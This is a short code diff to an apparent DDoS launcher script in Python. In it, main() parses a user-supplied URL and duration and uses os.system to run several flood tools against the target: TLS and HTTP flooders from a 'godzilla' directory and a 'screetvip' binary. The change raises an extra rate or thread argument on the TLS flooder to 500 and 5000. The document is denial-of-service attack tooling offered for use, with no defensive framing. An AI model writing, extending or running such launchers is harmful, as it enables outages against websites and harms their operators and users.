@@ -321,7 +321,7 @@ def main():
 				url = sin.split()[1]
 				port = sin.split()[2]
 				time = sin.split()[3]
-				os.system(f'cd godzilla && ./tls {url} {time} 300 2')
+				os.system(f'cd godzilla && ./tls {url} {time} 300 2 500')
 				os.system(f'cd godzilla && node tlsv2.js {url} {time} 300 2')
 				os.system(f'cd randomstring && ./screetvip {url} {time} 300 5')
 				os.system(f'cd godzilla && node HTTP.js {url} 500 1 {time}')
@@ -555,7 +555,7 @@ def main():
 				url = sin.split()[1]
 				port = sin.split()[2]
 				time = sin.split()[3]
-				os.system(f'cd godzilla && ./tls {url} {time} 300 2')
+				os.system(f'cd godzilla && ./tls {url} {time} 300 2 5000')
 				os.system(f'cd godzilla && node tlsv2.js {url} {time} 300 2')
 				os.system(f'cd randomstring && ./screetvip {url} {time} 300 5')
 				os.system(f'cd godzilla && node HTTP.js {url} 500 1 {time}')
